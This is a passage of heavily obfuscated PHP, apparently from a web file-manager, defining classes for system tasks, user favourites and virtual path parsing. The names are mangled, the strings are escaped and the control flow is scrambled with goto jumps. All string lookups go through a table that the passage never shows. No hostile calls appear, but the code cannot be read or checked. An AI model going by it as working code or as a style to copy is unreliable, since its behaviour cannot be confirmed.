$f¼†…Ë¬†ä) { return parent::update($aŒ‚ ŠŒ¡¡, $f¼†…Ë¬†ä); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\x2e\164\141\163\153\114\151\163\164"; public $field = array("\x6e\x61\155\x65", "\164\171\x70\145", "\145\x76\145\x6e\164", "\164\151\x6d\x65", "\x64\145\x73\x63", "\163\x79\163\164\145\155", "\x65\x6e\141\142\x6c\145", "\x6c\x61\x73\x74\x52\x75\156", "\x73\x6f\x72\164"); public function listData($D®¨•µ…Åé = false, $D âˆî‘½Ê = "\x73\x6f\162\x74", $b‡ÜîÑŠå = false) { return parent::listData($D®¨•µ…Åé, $D âˆî‘½Ê, $b‡ÜîÑŠå); } public function add($c¯•÷œ Œá) { $DÁ‰Îó¾÷Ö =& $_SERVER[Ö‘Øù]; $bİèÀ¶œ¥° = $this->findByName($c¯•÷œ Œá[$DÁ‰Îó¾÷Ö[28]]); if ($bİèÀ¶œ¥°) { return !1; } $c¯•÷œ Œá[$DÁ‰Îó¾÷Ö[1525]] = 0; $c¯•÷œ Œá[$DÁ‰Îó¾÷Ö[1753]] = $this->getSort(); return parent::insert($c¯•÷œ Œá); } private function getSort() { $fé¾‚ÔÑ¢  =& $_SERVER[Ö‘Øù]; $B …ä‘µÛ„ = parent::listData(); $f«‚Ù©¿õ¨ = array_to_keyvalue($B …ä‘µÛ„, $fé¾‚ÔÑ¢ [33], $fé¾‚ÔÑ¢ [1753]); return empty($f«‚Ù©¿õ¨) ? 0 : max($f«‚Ù©¿õ¨) + 1; } public function update($aÌóè‚‹Âá, $cÑƒÂÍïÜŒ) { $eŞŸŸ¸ª—Ò =& $_SERVER[Ö‘Øù]; $Cô¥‡è«Ïƒ = $this->listData($aÌóè‚‹Âá); $bËª£¿Î‚ = $this->findByName($cÑƒÂÍïÜŒ[$eŞŸŸ¸ª—Ò[28]]); if (!$Cô¥‡è«Ïƒ || $bËª£¿Î‚ && $bËª£¿Î‚[$eŞŸŸ¸ª—Ò[395]] != $Cô¥‡è«Ïƒ[$eŞŸŸ¸ª—Ò[395]]) { return !1; } return parent::update($aÌóè‚‹Âá, $cÑƒÂÍïÜŒ); } public function remove($f‚Ê÷‘·¤, $d¤¯ ¬Ò‡© = false) { $Cïò§Ÿğ¶ =& $_SERVER[Ö‘Øù]; $aŠ”‹ÀÀß = $this->listData($f‚Ê÷‘·¤); if (!$aŠ”‹ÀÀß) { return; } if (!$d¤¯ ¬Ò‡© && $aŠ”‹ÀÀß[$Cïò§Ÿğ¶[1205]] == $Cïò§Ÿğ¶[87]) { return !1; } return parent::remove($f‚Ê÷‘·¤); } public function enable($cµÖµñ‰Ô¿, $d‰†»İ¶½ß) { return $this->update($cµÖµñ‰Ô¿, array($_SERVER[Ö‘Øù][2141] => $d‰†»İ¶½ß)); } public function run($e‘Îî‹ªÖº) { return $this->update($e‘Îî‹ªÖº, array($_SERVER[Ö‘Øù][2151] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\162\137\x66\x61\x76"; protected function cacheFunctionAlias($B’’İ¹) { $d •Õ‹„ñ =& $_SERVER[Ö‘Øù]; return array($d •Õ‹„ñ[1837] => array(USER_ID, $d •Õ‹„ñ[2152])); } protected function listData() { $AÉÖôÕËƒ… =& $_SERVER[Ö‘Øù]; $a°Ôñéõï‚ = array($AÉÖôÕËƒ…[1552] => USER_ID, $AÉÖôÕËƒ…[478] => 0); $fƒ«áİåÀ¼ = $AÉÖôÕËƒ…[2153]; $DÃœ™á¿öÅ = $this->field($fƒ«áİåÀ¼)->where($a°Ôñéõï‚)->order($AÉÖôÕËƒ…[2154])->select(); return $DÃœ™á¿öÅ ? $DÃœ™á¿öÅ : array(); } protected function resetCache() { } protected function listView() { goto eÅÜ‰Ó•Ûö; D×›§´•Ûï: $E­ô›‘ÕŞ = array($e”ÇÏñŒÍ§[412] => array($e”ÇÏñŒÍ§[413], $fÁ³ùˆ©‹˜)); $Dæµ–¨ÈµĞ = Model($e”ÇÏñŒÍ§[825])->listSource($E­ô›‘ÕŞ, $Bƒ­Ø†‹¡›); $Dæµ–¨ÈµĞ = array_merge($Dæµ–¨ÈµĞ[$e”ÇÏñŒÍ§[74]], $Dæµ–¨ÈµĞ[$e”ÇÏñŒÍ§[75]]); goto Aéê³ë¾ Ö; eÅÜ‰Ó•Ûö: $e”ÇÏñŒÍ§ =& $_SERVER[Ö‘Øù]; $côéµÆÀÕ = $this->listData(); $a×Š¢ïƒ×ô = array_filter_by_field($côéµÆÀÕ, $e”ÇÏñŒÍ§[29], $e”ÇÏñŒÍ§[411]); goto a­ï¬Ö‡³; Aéê³ë¾ Ö: $Dæµ–¨ÈµĞ = array_to_keyvalue($Dæµ–¨ÈµĞ, $e”ÇÏñŒÍ§[397]); foreach ($côéµÆÀÕ as $Aëˆñ½íÙ· => $Bæ…«¦ˆ‡) { $b„Á³–‰Û = $Dæµ–¨ÈµĞ[$Bæ…«¦ˆ‡[$e”ÇÏñŒÍ§[76]]]; $b„Á³–‰Û = $b„Á³–‰Û ? $b„Á³–‰Û : array(); $côéµÆÀÕ[$Aëˆñ½íÙ·] = array_merge($b„Á³–‰Û, $Bæ…«¦ˆ‡); } return $côéµÆÀÕ; goto AÆ˜‰Å¶; a­ï¬Ö‡³: $fÁ³ùˆ©‹˜ = array_to_keyvalue($a×Š¢ïƒ×ô, $e”ÇÏñŒÍ§[33], $e”ÇÏñŒÍ§[76]); if (!$fÁ³ùˆ©‹˜) { return $côéµÆÀÕ; } $Bƒ­Ø†‹¡› = 2000; goto D×›§´•Ûï; AÆ˜‰Å¶: } protected function addFav($aáóòé›Ìø, $BÜ³Ÿè¤™ = '', $B»ÄÉÚ–Üñ = "\163\x6f\x75\162\143\145") { goto e×Ÿƒ¸; eõ±°ŞÇÛ: if (!$BÜ³Ÿè¤™ && $B»ÄÉÚ–Üñ == $E·íÁ”œŠ¬[411]) { $fäÄİÉ»ØË = Model($E·íÁ”œŠ¬[1240])->where(array($E·íÁ”œŠ¬[412] => $aáóòé›Ìø))->find(); if (!$fäÄİÉ»ØË) { return !1; } $BÜ³Ÿè¤™ = $fäÄİÉ»ØË[$E·íÁ”œŠ¬[28]]; } $BÜ³Ÿè¤™ = $this->getAutoName($BÜ³Ÿè¤™); $BŒ³™’“øï = array($E·íÁ”œŠ¬[1552] => USER_ID, $E·íÁ”œŠ¬[478] => 0, $E·íÁ”œŠ¬[415] => $BÜ³Ÿè¤™, $E·íÁ”œŠ¬[416] => $aáóòé›Ìø, $E·íÁ”œŠ¬[417] => $B»ÄÉÚ–Üñ, $E·íÁ”œŠ¬[1734] => $b½ÔŒİòÜ‰ + 1); goto eÂ·êİ¾‡; e×Ÿƒ¸: $E·íÁ”œŠ¬ =& $_SERVER[Ö‘Øù]; $d°Øš£’¸â = array($E·íÁ”œŠ¬[1552] => USER_ID, $E·íÁ”œŠ¬[478] => 0, $E·íÁ”œŠ¬[417] => $B»ÄÉÚ–Üñ, $E·íÁ”œŠ¬[416] => $aáóòé›Ìø); if ($this->where($d°Øš£’¸â)->find()) { return !1; } goto D‰Ôƒš‘ø£; D‰Ôƒš‘ø£: $d°Øš£’¸â = array($E·íÁ”œŠ¬[1552] => USER_ID, $E·íÁ”œŠ¬[478] => 0); $b½ÔŒİòÜ‰ = $this->where($d°Øš£’¸â)->max($E·íÁ”œŠ¬[1753]); if (!$b½ÔŒİòÜ‰) { $b½ÔŒİòÜ‰ = 0; } goto eõ±°ŞÇÛ; eÂ·êİ¾‡: return $this->add($BŒ³™’“øï); goto fòâêÆ±ƒ—; fòâêÆ±ƒ—: } protected function remove($FİÀ³³¾óà) { $C«‰¤µ¢§ =& $_SERVER[Ö‘Øù]; $D™Á²Å«Õ = array($C«‰¤µ¢§[1552] => USER_ID, $C«‰¤µ¢§[414] => $FİÀ³³¾óà); return $this->where($D™Á²Å«Õ)->delete(); } protected function removeByName($eÑê¾‹ö‰˜) { $dË©òË¡÷‹ =& $_SERVER[Ö‘Øù]; $f–â°ËòÃÄ = array($dË©òË¡÷‹[1552] => USER_ID, $dË©òË¡÷‹[415] => $eÑê¾‹ö‰˜, $dË©òË¡÷‹[478] => 0); return $this->where($f–â°ËòÃÄ)->delete(); } protected function rename($cÜâùò­õ, $aŒ›ğÛÍ¼á) { $AÍ«•§™ò =& $_SERVER[Ö‘Øù]; if ($cÜâùò­õ == $aŒ›ğÛÍ¼á) { return !1; } $EÇƒÆÍÃ¶ = $this->getAutoName($aŒ›ğÛÍ¼á); if ($aŒ›ğÛÍ¼á != $EÇƒÆÍÃ¶) { return !1; } $B·å²‹Ã®ó = array($AÍ«•§™ò[1552] => USER_ID, $AÍ«•§™ò[478] => 0, $AÍ«•§™ò[28] => $cÜâùò­õ); return $this->where($B·å²‹Ã®ó)->save(array($AÍ«•§™ò[28] => $aŒ›ğÛÍ¼á)); } protected function resetSort($dÛÈÎæ†ñÙ) { $FÅÕ§æ¯ƒ =& $_SERVER[Ö‘Øù]; $dÛÈÎæ†ñÙ = is_array($dÛÈÎæ†ñÙ) ? $dÛÈÎæ†ñÙ : array(); $aî¶“Ù‡— = array($FÅÕ§æ¯ƒ[1552] => USER_ID); for ($A”ÉÙÎ´‹ = 0; $A”ÉÙÎ´‹ < count($dÛÈÎæ†ñÙ); $A”ÉÙÎ´‹++) { $aî¶“Ù‡—[$FÅÕ§æ¯ƒ[414]] = $dÛÈÎæ†ñÙ[$A”ÉÙÎ´‹]; $this->where($aî¶“Ù‡—)->save(array($FÅÕ§æ¯ƒ[1734] => $A”ÉÙÎ´‹ + 1)); } return !0; } protected function moveTop($EÈÉŒßèÏ) { goto c‰Ğ¡Íõ›„; c‰Ğ¡Íõ›„: $FÈ‘ØÕ’ñ =& $_SERVER[Ö‘Øù]; $aòê†‰´½ = array($FÈ‘ØÕ’ñ[1552] => USER_ID, $FÈ‘ØÕ’ñ[478] => 0); $fš‡ÑÃ›™¬ = $this->where($aòê†‰´½)->where(array($FÈ‘ØÕ’ñ[28] => $EÈÉŒßèÏ))->find(); goto Añ…˜«™÷Ñ; AÇÙÁó—: $DÉ»­«¶„  = $Dâ¨·Óäªè; $Dâ¨·Óäªè = array_remove_value($Dâ¨·Óäªè, $fš‡ÑÃ›™¬[$FÈ‘ØÕ’ñ[395]]); array_unshift($Dâ¨·Óäªè, $fš‡ÑÃ›™¬[$FÈ‘ØÕ’ñ[395]]); goto b†ÙÇ´¡ƒÁ; Añ…˜«™÷Ñ: if (!$fš‡ÑÃ›™¬) { return; } $Dâ¨·Óäªè = $this->field($FÈ‘ØÕ’ñ[395])->where($aòê†‰´½)->order($FÈ‘ØÕ’ñ[2154])->select(); $Dâ¨·Óäªè = array_to_keyvalue($Dâ¨·Óäªè, $FÈ‘ØÕ’ñ[33], $FÈ‘ØÕ’ñ[395]); goto AÇÙÁó—; b†ÙÇ´¡ƒÁ: return $this->resetSort($Dâ¨·Óäªè); goto cŞÉÚ‘³˜Ë; cŞÉÚ‘³˜Ë: } protected function moveBottom($A–‚ç‡É›ò) { $F×¹×Ô¢ïÈ =& $_SERVER[Ö‘Øù]; $EÒîÒÜ†· = array($F×¹×Ô¢ïÈ[1552] => USER_ID, $F×¹×Ô¢ïÈ[478] => 0); $eŒÆÔàˆÎ“ = $this->where($EÒîÒÜ†·)->max($F×¹×Ô¢ïÈ[1753]); $cŒë”å´‹ù = array($F×¹×Ô¢ïÈ[1753] => $eŒÆÔàˆÎ“ + 1); return $this->where($EÒîÒÜ†·)->where(array($F×¹×Ô¢ïÈ[28] => $A–‚ç‡É›ò))->save($cŒë”å´‹ù); } private function getAutoName($c±¼ÔÓéŠ) { goto BŠõÇ†‡‡; DÍÓ“äµ®‘: $fª”Ó‰Î‚ì = array_to_keyvalue($fª”Ó‰Î‚ì, $cí™ƒŒ¢¢ˆ[33], $cí™ƒŒ¢¢ˆ[28]); if (!$fª”Ó‰Î‚ì || !in_array($c±¼ÔÓéŠ, $fª”Ó‰Î‚ì)) { return $c±¼ÔÓéŠ; } for ($Eë–Ï¢ø¿‘ = 0; $Eë–Ï¢ø¿‘ < count($fª”Ó‰Î‚ì); $Eë–Ï¢ø¿‘++) { if (!in_array($c±¼ÔÓéŠ . "\x28{$Eë–Ï¢ø¿‘}\x29", $fª”Ó‰Î‚ì)) { return $c±¼ÔÓéŠ . "\50{$Eë–Ï¢ø¿‘}\x29"; } } goto c¿³Å×Ë‘”; c¿³Å×Ë‘”: return $c±¼ÔÓéŠ . "\x28{$Eë–Ï¢ø¿‘}\x29"; goto B·ó†®ï²‘; BŠõÇ†‡‡: $cí™ƒŒ¢¢ˆ =& $_SERVER[Ö‘Øù]; $fñó»¦¡í = array($cí™ƒŒ¢¢ˆ[1552] => USER_ID, $cí™ƒŒ¢¢ˆ[478] => 0); $fª”Ó‰Î‚ì = $this->field($cí™ƒŒ¢¢ˆ[28])->where($fñó»¦¡í)->select(); goto DÍÓ“äµ®‘; B·ó†®ï²‘: } } goto BÁÍÖÅÎØ«; Aš¨‹Š–¨¤: class KodIO { const KOD_SOURCE = "\x7b\163\157\x75\162\x63\x65\175"; const KOD_USER_RECYCLE = "\173\165\163\145\x72\122\145\143\x79\x63\x6c\x65\x7d"; const KOD_USER_FAV = "\x7b\x75\163\145\162\x46\x61\x76\175"; const KOD_USER_FILE_TAG = "\173\165\x73\x65\162\x46\151\154\145\x54\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\x73\145\x72\x46\151\154\x65\x54\171\160\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\x6f\x75\160\122\157\x6f\164\123\145\x6c\146\x7d"; const KOD_USER_SHARE = "\173\165\x73\x65\x72\123\x68\x61\x72\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\165\163\145\x72\123\x68\141\162\x65\114\151\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\x72\x65\124\x6f\x4d\145\x7d"; const KOD_SHARE_ITEM = "\173\163\x68\x61\x72\145\111\x74\x65\155\175"; const KOD_SHARE_LINK = "\x7b\163\150\141\x72\145\111\164\x65\155\x4c\151\x6e\153\x7d"; const KOD_SEARCH = "\x7b\163\x65\x61\x72\x63\150\x7d"; const KOD_BLOCK = "\x7b\x62\154\157\143\153\175"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\x7b\165\163\145\162\122\145\156\x63\145\156\x74\175"; const KOD_USER_DRIVER = "\x7b\x64\x72\x69\x76\x65\162\x7d"; public static function typeList() { $cŸÃêƒ‚¸› =& $_SERVER[Ö‘Øù]; return array($cŸÃêƒ‚¸›[1173] => self::KOD_SOURCE, $cŸÃêƒ‚¸›[1174] => self::KOD_USER_RECYCLE, $cŸÃêƒ‚¸›[1175] => self::KOD_USER_FAV, $cŸÃêƒ‚¸›[1176] => self::KOD_USER_FILE_TAG, $cŸÃêƒ‚¸›[1177] => self::KOD_USER_FILE_TYPE, $cŸÃêƒ‚¸›[1178] => self::KOD_GROUP_ROOT_SELF, $cŸÃêƒ‚¸›[1179] => self::KOD_USER_SHARE, $cŸÃêƒ‚¸›[1180] => self::KOD_USER_SHARE_LINK, $cŸÃêƒ‚¸›[1181] => self::KOD_USER_SHARE_TO_ME, $cŸÃêƒ‚¸›[1182] => self::KOD_SHARE_ITEM, $cŸÃêƒ‚¸›[1183] => self::KOD_SHARE_LINK, $cŸÃêƒ‚¸›[1184] => self::KOD_SEARCH, $cŸÃêƒ‚¸›[1185] => self::KOD_BLOCK, $cŸÃêƒ‚¸›[1186] => self::KOD_IO, $cŸÃêƒ‚¸›[1187] => self::KOD_USER_RECENT, $cŸÃêƒ‚¸›[1188] => self::KOD_USER_DRIVER); } public static function parse($f«–ÈÓ­˜¿) { goto F¥õÃŠÄš; AñÏØàÄ‚í: preg_match($fö­ğ²·£ò[1189], $f«–ÈÓ­˜¿, $eèó‰Í¶…º); $bàùøöâ¤Î = array($fö­ğ²·£ò[417] => !1, $fö­ğ²·£ò[1190] => !1, $fö­ğ²·£ò[414] => !1, $fö­ğ²·£ò[76] => $f«–ÈÓ­˜¿, $fö­ğ²·£ò[1099] => !1, $fö­ğ²·£ò[1098] => $fö­ğ²·£ò[33]); if (is_array($eèó‰Í¶…º) && count($eèó‰Í¶…º) == 5) { $D¹®ÀíÇÂ = $fö­ğ²·£ò[1191] . $eèó‰Í¶…º[2] . $fö­ğ²·£ò[325]; if (in_array($D¹®ÀíÇÂ, $C“àÕã¥„ò)) { $bàùøöâ¤Î[$fö­ğ²·£ò[1099]] = $eèó‰Í¶…º[1]; $bàùøöâ¤Î[$fö­ğ²·£ò[29]] = $D¹®ÀíÇÂ; $bàùøöâ¤Î[$fö­ğ²·£ò[1192]] = substr($D¹®ÀíÇÂ, 1, -1); $bàùøöâ¤Î[$fö­ğ²·£ò[395]] = $eèó‰Í¶…º[3]; } $bàùøöâ¤Î[$fö­ğ²·£ò[1098]] = $eèó‰Í¶…º[4]; } goto D¢é¨ÂÂš…; F¥õÃŠÄš: $fö­ğ²·£ò =& $_SERVER[Ö‘Øù]; $f«–ÈÓ­˜¿ = self::clear($f«–ÈÓ­˜¿); $C“àÕã¥„ò = array_values(self::typeList()); goto AñÏØàÄ‚í; D¢é¨ÂÂš…: $Aõ¨ï„³µî = array($fö­ğ²·£ò[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $bàùøöâ¤Î[$fö­ğ²·£ò[1154]] = in_array($bàùøöâ¤Î[$fö­ğ²·£ò[29]], $Aõ¨ï„³µî); return $bàùøöâ¤Î; goto b›íœ‰”œç; b›íœ‰”œç: } public static function isTruePath($A…Òã‡…îº) { goto DªÆ…Öàš¹; AìÙ–Ëï: if (strpos($A…Òã‡…îº, $C×åö´‚¢¨[1195]) === 0) { return !0; } return !1; goto E˜ÅŠÆÆâ; DªÆ…Öàš¹: $C×åö´‚¢¨ =& $_SERVER[Ö‘Øù]; if (substr($A…Òã‡…îº, 0, 1) != $C×åö´‚¢¨[1191]) { return !0; } if (strpos($A…Òã‡…îº, $C×åö´‚¢¨[403]) === 0) { return !0; } goto EÇ¢Ú½½Œä; EÇ¢Ú½½Œä: if (strpos($A…Òã‡…îº, $C×åö´‚¢¨[1158]) === 0) { return !0; } if (strpos($A…Òã‡…îº, $C×åö´‚¢¨[1193]) === 0) { return !0; } if (strpos($A…Òã‡…îº, $C×åö´‚¢¨[1194]) === 0) { return !0; } goto AìÙ–Ëï; E˜ÅŠÆÆâ: } public static function clear($EÍàÊñŸ½¹) { goto Aˆ÷¡Ë’ƒ™; eøá²˜Òñ„: return $EÍàÊñŸ½¹; goto AÜŠ¢‘È¹İ; e‡—‹ÛÁ: $EÍàÊñŸ½¹ = preg_replace($E¨»Ÿğ¼–[1198], $E¨»Ÿğ¼–[8], $EÍàÊñŸ½¹); if ($EÍàÊñŸ½¹ == $E¨»Ÿğ¼–[8]) { return $E¨»Ÿğ¼–[8]; } $EÍàÊñŸ½¹ = rtrim($EÍàÊñŸ½¹, $E¨»Ÿğ¼–[8]); goto eøá²˜Òñ„; Aˆ÷¡Ë’ƒ™: $E¨»Ÿğ¼– =& $_SERVER[Ö‘Øù]; $EÍàÊñŸ½¹ = str_replace(array($E¨»Ÿğ¼–[1072], $E¨»Ÿğ¼–[229]), $E¨»Ÿğ¼–[50], $EÍàÊñŸ½¹); $EÍàÊñŸ½¹ = str_replace($E¨»Ÿğ¼–[97], $E¨»Ÿğ¼–[8], $EÍàÊñŸ½¹); goto EÊ—áŒ¢»ö; EÊ—áŒ¢»ö: $e·ÛâŒ‹“¾ = $E¨»Ÿğ¼–[1196]; if (substr($EÍàÊñŸ½¹, 0, 3) == $E¨»Ÿğ¼–[1197]) { $EÍàÊñŸ½¹ = substr($EÍàÊñŸ½¹, 3); } while (strstr($EÍàÊñŸ½¹, $e·ÛâŒ‹“¾)) { $EÍàÊñŸ½¹ = str_replace($e·ÛâŒ‹“¾, $E¨»Ÿğ¼–[8], $EÍàÊñŸ½¹); } goto e‡—‹ÛÁ; AÜŠ¢‘È¹İ: } public static function sourceID($CÒÌíÊõÍ) { $F‘èÄùˆÒä =& $_SERVER[Ö‘Øù]; $D¨ÅÄ‚¾À† = self::parse($CÒÌíÊõÍ); if ($D¨ÅÄ‚¾À†[$F‘èÄùˆÒä[29]] !== self::KOD_SOURCE) { show_json(LNG($F‘èÄùˆÒä[1199]), !1); } return $D¨ÅÄ‚¾À†[$F‘èÄùˆÒä[395]]; } public static function make($D•ïÔéùæ) { if (!$D•ïÔéùæ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($D•ïÔéùæ)); } public static function makeShare($d¹Ôù…ìâ—, $B§ĞòêÇÄ) { return self::makePath(self::KOD_SHARE_ITEM, $d¹Ôù…ìâ—, $B§ĞòêÇÄ); } public static function makeFileTypePath($b–åÊ¬Ô°÷) { return self::makePath(self::KOD_USER_FILE_TYPE, $b–åÊ¬Ô°÷); } public static function makeFileTagPath($dÏ—ñ¹›Ì‚) { return self::makePath(self::KOD_USER_FILE_TAG, $dÏ—ñ¹›Ì‚); } public static function makePath($Aì®Š –³Ó, $DÂá¿ÊÚè£ = '', $eóÜäó‹÷ = '') { $d…ĞŸô¹»£ =& $_SERVER[Ö‘Øù]; $FÍƒõªÆÉ‚ = substr($Aì®Š –³Ó, 1, -1); $E¾Ó²Õ¾ˆÍ = $d…ĞŸô¹»£[1200] . $FÍƒõªÆÉ‚ . $d…ĞŸô¹»£[1201] . $DÂá¿ÊÚè£ . $d…ĞŸô¹»£[1202]; $E¾Ó²Õ¾ˆÍ = $eóÜäó‹÷ ? $E¾Ó²Õ¾ˆÍ . $eóÜäó‹÷ . $d…ĞŸô¹»£[8] : $E¾Ó²Õ¾ˆÍ; return $E¾Ó²Õ¾ˆÍ; } public static function hashPath($fÂßÊõšÙ”, $F†îØÊğ½‹ = true) { goto câõôù‡¼Š; D¹ñçº: return $D„ùØİòíé; goto DŒˆÄ‘…ùä; c¬ƒµ´İ½—: if (!$D„ùØİòíé && isset($eÊ¤°ã©î[$d¬²­Û‡ÛÄ[397]])) { $eÊ¤°ã©î = IO::info(KodIO::make($eÊ¤°ã©î[$d¬²­Û‡ÛÄ[397]])); $D„ùØİòíé = _get($eÊ¤°ã©î, $d¬²­Û‡ÛÄ[1203], $d¬²­Û‡ÛÄ[33]); } if (!$D„ùØİòíé && $F†îØÊğ½‹) { $E¾¹ÙÅß = KodIO::parse($eÊ¤°ã©î[$d¬²­Û‡ÛÄ[76]]); if (!$E¾¹ÙÅß[$d¬²­Û‡ÛÄ[29]]) { $D„ùØİòíé = IO::hashSimple($eÊ¤°ã©î[$d¬²­Û‡ÛÄ[76]]); } } if (!$D„ùØİòíé) { $D„ùØİòíé = md5($eÊ¤°ã©î[$d¬²­Û‡ÛÄ[76]] . $eÊ¤°ã©î[$d¬²­Û‡ÛÄ[78]] . $eÊ¤°ã©î[$d¬²­Û‡ÛÄ[84]]); } goto D¹ñçº; câõôù‡¼Š: $d¬²­Û‡ÛÄ =& $_SERVER[Ö‘Øù]; $eÊ¤°ã©î = is_array($fÂßÊõšÙ”) ? $fÂßÊõšÙ” : IO::info($fÂßÊõšÙ”); $D„ùØİòíé = _get($eÊ¤°ã©î, $d¬²­Û‡ÛÄ[1203], $d¬²­Û‡ÛÄ[33]); goto c¬ƒµ´İ½—; DŒˆÄ‘…ùä: } public static function initSystemPath() { goto E¼áíİ’ç¦; cö‡œîì±: define($b™·³‘ÛÆ†[1206], self::systemPath($b™·³‘ÛÆ†[1207])); define($b™·³‘ÛÆ†[1208], self::systemPath($b™·³‘ÛÆ†[1209])); define($b™·³‘ÛÆ†[1210], self::systemPath($b™·³‘ÛÆ†[1211])); goto eÇó— ¡¯å; eÇó— ¡¯å: IOHistory::bindEvent(); goto D¬›¯ ‰œĞ; E¼áíİ’ç¦: $b™·³‘ÛÆ† =& $_SERVER[Ö‘Øù]; if (defined($b™·³‘ÛÆ†[1204])) { return; } define($b™·³‘ÛÆ†[1204], self::systemPath($b™·³‘ÛÆ†[1205])); goto cö‡œîì±; D¬›¯ ‰œĞ: } public static function systemPath($Cù±­ˆìàÂ) { goto F£¼®¶‡‘º; F£¼®¶‡‘º: $eÎËµ¬ç¥¨ =& $_SERVER[Ö‘Øù]; $bŸğÛ¾¦×Ş = $eÎËµ¬ç¥¨[1212] . ucfirst($Cù±­ˆìàÂ); $F‰ÎŠ¦©“ù = Model($eÎËµ¬ç¥¨[763])->get($bŸğÛ¾¦×Ş); goto EÁÆßÁğ¯; EÁÆßÁğ¯: if ($F‰ÎŠ¦©“ù) { return $F‰ÎŠ¦©“ù; } if ($Cù±­ˆìàÂ == $eÎËµ¬ç¥¨[1205]) { $F‰ÎŠ¦©“ù = self::make(Model($eÎËµ¬ç¥¨[825])->systemRootPathAdd($eÎËµ¬ç¥¨[532])); } else { $F‰ÎŠ¦©“ù = self::systemPath($eÎËµ¬ç¥¨[1205]); $b‹æô†¸§ = self::sourceID($F‰ÎŠ¦©“ù); $F‰ÎŠ¦©“ù = self::make(Model($eÎËµ¬ç¥¨[825])->mkdir($b‹æô†¸§, $Cù±­ˆìàÂ)); } Model($eÎËµ¬ç¥¨[763])->set($bŸğÛ¾¦×Ş, $F‰ÎŠ¦©“ù); goto EİŠøù’™; EİŠøù’™: return $F‰ÎŠ¦©“ù; goto DÚ­Ë²ô„¹; DÚ­Ë²ô„¹: } public static function systemFolder($d¹‘ìŠ‹ï) { $B‚£òí©„© = IO_PATH_SYSTEM_SOURCE . $d¹‘ìŠ‹ï; $B×ä¹”ÕŒÕ = Cache::get($B‚£òí©„©); if (!$B×ä¹”ÕŒÕ) { $EÛ÷¦Ğ´•Œ = IO::infoFull($B‚£òí©„©); if (!$EÛ÷¦Ğ´•Œ) { $B×ä¹”ÕŒÕ = IO::mkdir($B‚£òí©„©, REPEAT_SKIP); } else { $B×ä¹”ÕŒÕ = $EÛ÷¦Ğ´•Œ[$_SERVER[Ö‘Øù][76]]; } Cache::set($B‚£òí©„©, $B×ä¹”ÕŒÕ, 3600 * 10); } return $B×ä¹”ÕŒÕ; } public static function defaultDriver() { return Model($_SERVER[Ö‘Øù][760])->defaultDriver(); } public static function defaultIO() { $eáš‰áÆ‡  =& $_SERVER[Ö‘Øù]; $d‡»“µõğ” = self::defaultDriver(); return $eáš‰áÆ‡ [1213] . $d‡»“µõğ”[$eáš‰áÆ‡ [395]] . $eáš‰áÆ‡ [1202]; } public static function defaultDriverInit() { static $b¥óé†œâ² = false; if ($b¥óé†œâ²) { return $b¥óé†œâ²; } $b¥óé†œâ² = IO::init(self::defaultIO()); return $b¥óé†œâ²; } public static function fileTypeList() { $B–áÅÆ­† =& $_SERVER[Ö‘Øù]; $bñ²ÚÀ……ô = $GLOBALS[$B–áÅÆ­†[6]][$B–áÅÆ­†[1214]]; foreach ($bñ²ÚÀ……ô as $dŞ½âç‰ùÎ => $e¬Õ™ Òµ‰) { $F•¦ÛÆ—‹ = $B–áÅÆ­†[1215] . $dŞ½âç‰ùÎ; $FÌ´©‘³¹Ê = LNG($F•¦ÛÆ—‹); if ($F•¦ÛÆ—‹ != $FÌ´©‘³¹Ê) { $bñ²ÚÀ……ô[$dŞ½âç‰ùÎ][$B–áÅÆ­†[28]] = $FÌ´©‘³¹Ê; } } return $bñ²ÚÀ……ô; } public static function transferType($dñÈ¿–Á, $CÎèÚ¦ÒÛÊ) { goto AçˆÉ¸“¤Ú; AçˆÉ¸“¤Ú: $FÆ›Ö’ =& $_SERVER[Ö‘Øù]; $b¼‚çÜÖ = self::driverType($dñÈ¿–Á); $Cíˆİñ£ß = self::driverType($CÎèÚ¦ÒÛÊ); goto DæßÌƒã‚; F­ƒš½: return $FÆ›Ö’[1218]; goto e‰âªºõÜ‘; DæßÌƒã‚: if ($b¼‚çÜÖ[$FÆ›Ö’[29]] == $Cíˆİñ£ß[$FÆ›Ö’[29]] && $b¼‚çÜÖ[$FÆ›Ö’[1216]] == $Cíˆİñ£ß[$FÆ›Ö’[1216]]) { return $FÆ›Ö’[1217]; } if ($b¼‚çÜÖ[$FÆ›Ö’[29]] == $FÆ›Ö’[865] && $Cíˆİñ£ß[$FÆ›Ö’[29]] == $FÆ›Ö’[106]) { return $FÆ›Ö’[1128]; } if ($b¼‚çÜÖ[$FÆ›Ö’[29]] == $FÆ›Ö’[106] && $Cíˆİñ£ß[$FÆ›Ö’[29]] == $FÆ›Ö’[865]) { return $FÆ›Ö’[107]; } goto F­ƒš½; e‰âªºõÜ‘: } public static function driverType($E‚‘ßô°¤) { goto cÃºÅº¡Şæ; cÃºÅº¡Şæ: $céÊø†”ó =& $_SERVER[Ö‘Øù]; $FÈŠö¨­­ = $E‚‘ßô°¤->path; $dîñ¯„‡óÉ = str_replace($céÊø†”ó[1219], $céÊø†”ó[33], strtolower($E‚‘ßô°¤->getType())); goto Aë¤‹ô¬÷; Aë¤‹ô¬÷: if ($dîñ¯„‡óÉ == $céÊø†”ó[751] || $dîñ¯„‡óÉ == $céÊø†”ó[1220] || $dîñ¯„‡óÉ == $céÊø†”ó[1221]) { $E‚‘ßô°¤ = self::defaultDriverInit(); } else { if ($dîñ¯„‡óÉ == $céÊø†”ó[1135] || $dîñ¯„‡óÉ == $céÊø†”ó[1222]) { $E‚‘ßô°¤ = IO::init($E‚‘ßô°¤->pathParse[$céÊø†”ó[1082]]); } } $dîñ¯„‡óÉ = str_replace($céÊø†”ó[1219], $céÊø†”ó[33], strtolower($E‚‘ßô°¤->getType())); if ($dîñ¯„‡óÉ == $céÊø†”ó[106]) { return array($céÊø†”ó[29] => $céÊø†”ó[106], $céÊø†”ó[1216] => 